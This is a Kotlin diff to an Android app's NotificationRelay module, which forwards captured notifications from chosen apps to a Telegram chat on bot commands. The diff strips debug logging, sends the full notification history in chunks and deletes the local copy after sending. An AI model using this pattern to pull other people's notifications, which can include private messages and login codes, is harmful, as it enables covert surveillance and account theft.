@@ -177,8 +177,6 @@ object NotificationRelay {
     // --- Core Handler for Adding Noti App ---
 
     fun handleNotiAddPick(context: Context, chatId: String, pkg: String) {
-        Log.i(TAG, "handleNotiAddPick called with pkg=$pkg, chatId=$chatId")
-        UploadManager.sendTelegramMessage(chatId, "DEBUG: handleNotiAddPick called for $pkg")
         addAllowedApp(context, pkg)
         val pm = context.packageManager
         val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
@@ -186,8 +184,6 @@ object NotificationRelay {
     }
 
     fun handleNotiRemovePick(context: Context, chatId: String, pkg: String) {
-        Log.i(TAG, "handleNotiRemovePick called with pkg=$pkg, chatId=$chatId")
-        UploadManager.sendTelegramMessage(chatId, "DEBUG: handleNotiRemovePick called for $pkg")
         removeAllowedApp(context, pkg)
         val pm = context.packageManager
         val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
@@ -195,7 +191,6 @@ object NotificationRelay {
     }
 
     fun handleNotiAdd(context: Context, chatId: String, page: Int = 0) {
-        Log.i(TAG, "handleNotiAdd called with chatId=$chatId, page=$page")
         CoroutineScope(Dispatchers.IO).launch {
             val keyboard = buildAllAppsInlineKeyboard(context, "notiaddpick", page)
             UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to add for notification relay:", keyboard)
@@ -203,7 +198,6 @@ object NotificationRelay {
     }
 
     fun handleNotiRemove(context: Context, chatId: String, page: Int = 0) {
-        Log.i(TAG, "handleNotiRemove called with chatId=$chatId, page=$page")
         CoroutineScope(Dispatchers.IO).launch {
             val keyboard = buildTrackedAppsInlineKeyboard(context, "notiremovepick", page)
             UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to remove from notification relay:", keyboard)
@@ -211,12 +205,10 @@ object NotificationRelay {
     }
 
     fun handleNoti(context: Context, chatId: String) {
-        Log.i(TAG, "handleNoti called with chatId=$chatId")
         val pm = context.packageManager
         val allowed = getAllowedApps(context)
         if (allowed.isEmpty()) {
             UploadManager.sendTelegramMessage(chatId, "No apps are being relayed. Use /notiadd to add.")
-            Log.d(TAG, "No allowed apps to relay")
             return
         }
         val sb = StringBuilder()
@@ -233,13 +225,11 @@ object NotificationRelay {
     }
 
     fun handleNotiPick(context: Context, chatId: String, pkg: String) {
-        Log.i(TAG, "handleNotiPick called with pkg=$pkg, chatId=$chatId")
         val pm = context.packageManager
         val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
         val notis = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg)
         if (notis.isEmpty()) {
             UploadManager.sendTelegramMessage(chatId, "No notifications for $label.")
-            Log.d(TAG, "No notifications for $label")
             return
         }
         // Deduplicate consecutive duplicates (title, text, time)
@@ -251,20 +241,35 @@ object NotificationRelay {
             }
             last = current
         }
-        val sb = StringBuilder()
-        sb.append("Recent notifications for $label:\n\n")
-        deduped.take(10).forEachIndexed { idx, triple ->
+        // Telegram message limit is 4096 chars per message
+        val maxLen = 4096
+        val header = "Recent notifications for $label:\n\n"
+        var sb = StringBuilder()
+        sb.append(header)
+        var part = 1
+        var sentAny = false
+        deduped.forEachIndexed { idx, triple ->
             val (title, text, time) = triple
             val date = DateFormat.format("yyyy-MM-dd HH:mm", Date(time)).toString()
-            sb.append("${idx + 1}. $title\n$text\n$date\n\n")
+            val entry = "${idx + 1}. $title\n$text\n$date\n\n"
+            if (sb.length + entry.length > maxLen) {
+                // send previous batch
+                UploadManager.sendTelegramMessage(chatId, sb.toString())
+                sentAny = true
+                sb = StringBuilder()
+                sb.append("Cont'd notifications for $label (part ${++part}):\n\n")
+            }
+            sb.append(entry)
         }
-        UploadManager.sendTelegramMessage(chatId, sb.toString())
-        Log.d(TAG, "Sent last notifications for $label ($pkg) with deduplication, shown=${deduped.take(10).size}")
+        if (sb.isNotEmpty()) {
+            UploadManager.sendTelegramMessage(chatId, sb.toString())
+            sentAny = true
+        }
+        // Clear sent notifications from DB
+        NotificationListenerServiceImpl.clearNotificationsForPackage(context, pkg)
     }
 
     fun handleNotiClearPick(context: Context, chatId: String, pkg: String) {
-        Log.i(TAG, "handleNotiClearPick called with pkg=$pkg, chatId=$chatId")
-        UploadManager.sendTelegramMessage(chatId, "DEBUG: handleNotiClearPick called for $pkg")
         NotificationListenerServiceImpl.clearNotificationsForPackage(context, pkg)
         val pm = context.packageManager
         val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
@@ -272,11 +277,9 @@ object NotificationRelay {
     }
 
     fun handleNotiExportPick(context: Context, chatId: String, pkg: String) {
-        Log.i(TAG, "handleNotiExportPick called with pkg=$pkg, chatId=$chatId")
         val notis = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg)
         if (notis.isEmpty()) {
             UploadManager.sendTelegramMessage(chatId, "No notifications to export for $pkg.")
-            Log.d(TAG, "No notifications to export for $pkg")
             return
         }
         // Deduplicate
@@ -298,11 +301,9 @@ object NotificationRelay {
             sb.append("${idx + 1}. $title\n$text\n$date\n\n")
         }
         UploadManager.sendTelegramMessage(chatId, sb.toString())
-        Log.d(TAG, "Exported notifications for $label ($pkg) with deduplication, exported=${deduped.size}")
     }
 
     fun handleNotiClear(context: Context, chatId: String, page: Int = 0) {
-        Log.i(TAG, "handleNotiClear called with chatId=$chatId, page=$page")
         CoroutineScope(Dispatchers.IO).launch {
             val keyboard = buildTrackedAppsInlineKeyboard(context, "noticlearpick", page)
             UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to clear notifications:", keyboard)
@@ -310,7 +311,6 @@ object NotificationRelay {
     }
 
     fun handleNotiExport(context: Context, chatId: String, page: Int = 0) {
-        Log.i(TAG, "handleNotiExport called with chatId=$chatId, page=$page")
         CoroutineScope(Dispatchers.IO).launch {
             val keyboard = buildTrackedAppsInlineKeyboard(context, "notiexportpick", page)
             UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to export notifications:", keyboard)
